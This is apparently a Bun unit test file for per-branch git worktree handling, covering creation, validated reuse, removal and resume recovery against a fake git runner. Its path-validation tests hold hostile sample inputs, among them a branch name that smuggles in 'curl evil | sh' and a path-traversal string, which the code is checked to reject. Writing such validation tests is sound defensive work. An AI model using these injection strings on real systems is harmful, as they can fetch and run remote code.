import { test, expect, describe, beforeEach } from "bun:test";
import { resolve } from "path";
import {
  ensureWorktree,
  removeWorktree,
  recreateWorktreeForExistingBranch,
  resolveWorktreePath,
  WORKTREE_SUBDIR,
  type GitGhRunner,
  type WorktreeStatus,
} from "../../src/session/worktree";

/**
 * Unit tests for the per-branch worktree logic (Issue #154). A fake
 * {@link GitGhRunner} stands in for git/gh so these tests exercise the Q1/Q2/Q4
 * branching without touching a real repo. The journey AC (issue body) maps to:
 *   - AC-1 (unknown branch → worktree from default): "creates a new branch ..."
 *   - AC-3 (existing worktree → reuse):              "reuses ..."
 *   - AC-4 (empty branch → error):                   "rejects ..."
 */

class FakeRunner implements GitGhRunner {
  existing = new Set<string>(); // worktree paths that already exist (Q4)
  branches = new Set<string>(); // refs that resolve (Q1)
  // Q4 validation (#158): path → registered-worktree status. Defaults to
  // "not a registered worktree" (residue) when a path exists on disk but was
  // not created by the fake's add* methods.
  statuses = new Map<string, WorktreeStatus>();
  defaultBranchName = "main";
  calls: string[] = [];

  branchExists(_dir: string, branch: string): boolean {
    this.calls.push(`branchExists:${branch}`);
    return this.branches.has(branch);
  }
  defaultBranch(_dir: string): string {
    this.calls.push(`defaultBranch`);
    return this.defaultBranchName;
  }
  addWorktreeFromBranch(_dir: string, path: string, branch: string): void {
    this.calls.push(`addFromBranch:${branch}`);
    this.existing.add(path);
    // Creating a worktree registers it on `branch` (models real git).
    this.statuses.set(path, { registered: true, branch });
  }
  addWorktreeNewBranch(
    _dir: string,
    path: string,
    branch: string,
    base: string,
  ): void {
    this.calls.push(`addNewBranch:${branch}:${base}`);
    this.existing.add(path);
    this.statuses.set(path, { registered: true, branch });
  }
  removeWorktree(_dir: string, path: string): void {
    this.calls.push(`remove:${path}`);
    this.existing.delete(path);
    this.statuses.delete(path);
  }
  pathExists(path: string): boolean {
    return this.existing.has(path);
  }
  worktreeStatus(_dir: string, path: string): WorktreeStatus {
    this.calls.push(`worktreeStatus:${path}`);
    return this.statuses.get(path) ?? { registered: false };
  }
}

const REPO = "/Users/x/agent-base";

describe("resolveWorktreePath", () => {
  test("maps a simple branch to <repo>/.claude/worktrees/<branch>", () => {
    expect(resolveWorktreePath(REPO, "feature-foo")).toBe(
      resolve(REPO, WORKTREE_SUBDIR, "feature-foo"),
    );
  });

  test("allows slash branch names as nested dirs", () => {
    expect(resolveWorktreePath(REPO, "feat/foo")).toBe(
      resolve(REPO, WORKTREE_SUBDIR, "feat/foo"),
    );
  });

  test("rejects path traversal that escapes the worktrees root", () => {
    expect(() => resolveWorktreePath(REPO, "../../../tmp/evil")).toThrow(
      /path traversal/,
    );
  });

  test("rejects empty / dot branch that resolves to the root itself", () => {
    expect(() => resolveWorktreePath(REPO, ".")).toThrow(/不正/);
  });

  test("rejects shell-injection chars that would break out of cd \"<path>\"", () => {
    // Each of these is dangerous inside the downstream `cd "<path>"` string.
    for (const bad of [
      'foo"; curl evil | sh; echo "',
      "foo`id`",
      "foo$HOME",
      "foo\\bar",
      "foo\nbar",
    ]) {
      expect(() => resolveWorktreePath(REPO, bad)).toThrow(/使用できない文字/);
    }
  });

  test("allows ordinary ref punctuation (dash, dot, slash, underscore)", () => {
    expect(() => resolveWorktreePath(REPO, "feat/foo-bar.v2_x")).not.toThrow();
  });
});

describe("ensureWorktree", () => {
  let runner: FakeRunner;
  beforeEach(() => {
    runner = new FakeRunner();
  });

  test("AC-1: unknown branch → creates worktree from default branch", () => {
    runner.defaultBranchName = "main";
    const result = ensureWorktree(REPO, "feature-foo", runner);

    expect(result.reused).toBe(false);
    expect(result.baseBranch).toBe("main");
    expect(result.path).toBe(resolve(REPO, WORKTREE_SUBDIR, "feature-foo"));
    expect(runner.calls).toContain("addNewBranch:feature-foo:main");
  });

  test("Q1: existing branch → checkout into worktree (no new branch)", () => {
    runner.branches.add("existing-branch");
    const result = ensureWorktree(REPO, "existing-branch", runner);

    expect(result.reused).toBe(false);
    expect(result.baseBranch).toBeUndefined();
    expect(runner.calls).toContain("addFromBranch:existing-branch");
    expect(runner.calls.some((c) => c.startsWith("addNewBranch"))).toBe(false);
  });

  test("AC-3 / Q4: existing valid worktree on the expected branch → reuse, no git add", () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: "feature-foo" });

    const result = ensureWorktree(REPO, "feature-foo", runner);

    expect(result.reused).toBe(true);
    expect(result.path).toBe(path);
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
    // Reuse is validated, not assumed (#158).
    expect(runner.calls).toContain(`worktreeStatus:${path}`);
  });

  // --- #158: reuse must be validated, never silently assumed -------------

  test("#158 AC-1: path exists but is NOT a registered worktree (residue) → explicit error, no silent reuse", () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path); // dir present on disk...
    // ...but no status entry → worktreeStatus reports {registered:false}.

    expect(() => ensureWorktree(REPO, "feature-foo", runner)).toThrow(
      /git worktree ではありません|残骸/,
    );
    // Must not fall through to creating/reusing.
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("#158 AC-1: path is a worktree but checked out on a DIFFERENT branch → explicit error", () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: "some-other-branch" });

    expect(() => ensureWorktree(REPO, "feature-foo", runner)).toThrow(
      /branch.*一致|期待 branch/,
    );
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("#158: a detached-HEAD worktree (no branch) → explicit error, not silent reuse", () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: null });

    expect(() => ensureWorktree(REPO, "feature-foo", runner)).toThrow();
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("#158 AC-2: valid worktree on the expected branch → reuse succeeds (no regression)", () => {
    const path = resolveWorktreePath(REPO, "feat/foo-bar");
    runner.existing.add(path);
    runner.statuses.set(path, { registered: true, branch: "feat/foo-bar" });

    const result = ensureWorktree(REPO, "feat/foo-bar", runner);
    expect(result.reused).toBe(true);
    expect(result.path).toBe(path);
  });

  test("is idempotent: second ensure of the same branch reuses", () => {
    ensureWorktree(REPO, "feature-foo", runner); // creates
    const second = ensureWorktree(REPO, "feature-foo", runner);
    expect(second.reused).toBe(true);
  });

  test("uses dynamic default branch (Q2: master/develop mixed repos)", () => {
    runner.defaultBranchName = "develop";
    const result = ensureWorktree(REPO, "new-feat", runner);
    expect(result.baseBranch).toBe("develop");
    expect(runner.calls).toContain("addNewBranch:new-feat:develop");
  });

  test("AC-4: empty / whitespace branch throws", () => {
    expect(() => ensureWorktree(REPO, "", runner)).toThrow(/必須/);
    expect(() => ensureWorktree(REPO, "   ", runner)).toThrow(/必須/);
  });

  test("trims surrounding whitespace from branch name", () => {
    const result = ensureWorktree(REPO, "  feature-foo  ", runner);
    expect(result.path).toBe(resolve(REPO, WORKTREE_SUBDIR, "feature-foo"));
  });
});

describe("removeWorktree", () => {
  test("delegates to the runner (Q3)", () => {
    const runner = new FakeRunner();
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);

    removeWorktree(REPO, path, runner);

    expect(runner.calls).toContain(`remove:${path}`);
    expect(runner.pathExists(path)).toBe(false);
  });
});

/**
 * Resume-recovery path (Issue #217). A stopped branch session's worktree is
 * removed on /session stop, but the branch + cwd-keyed transcript survive, so
 * resume re-creates the worktree at the SAME path. Unlike ensureWorktree, an
 * unknown branch must NOT be created from default (no Q2) — recovery returns
 * false so the caller surfaces a clear error.
 */
describe("recreateWorktreeForExistingBranch (#217)", () => {
  let runner: FakeRunner;
  beforeEach(() => {
    runner = new FakeRunner();
  });

  test("Q4: worktree path already present → true, no git add", () => {
    const path = resolveWorktreePath(REPO, "feat-217");
    runner.existing.add(path);
    expect(recreateWorktreeForExistingBranch(REPO, "feat-217", runner)).toBe(
      true,
    );
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("Q1: existing branch, missing worktree → checks out from branch, true", () => {
    runner.branches.add("feat-217");
    expect(recreateWorktreeForExistingBranch(REPO, "feat-217", runner)).toBe(
      true,
    );
    expect(runner.calls).toContain("addFromBranch:feat-217");
    // No Q2 new-branch creation on the recovery path.
    expect(runner.calls.some((c) => c.startsWith("addNewBranch"))).toBe(false);
  });

  test("branch gone → false WITHOUT creating a new branch (no Q2)", () => {
    expect(recreateWorktreeForExistingBranch(REPO, "deleted", runner)).toBe(
      false,
    );
    expect(runner.calls).toContain("branchExists:deleted");
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("empty / whitespace branch → false, no git calls", () => {
    expect(recreateWorktreeForExistingBranch(REPO, "   ", runner)).toBe(false);
    expect(runner.calls.length).toBe(0);
  });
});
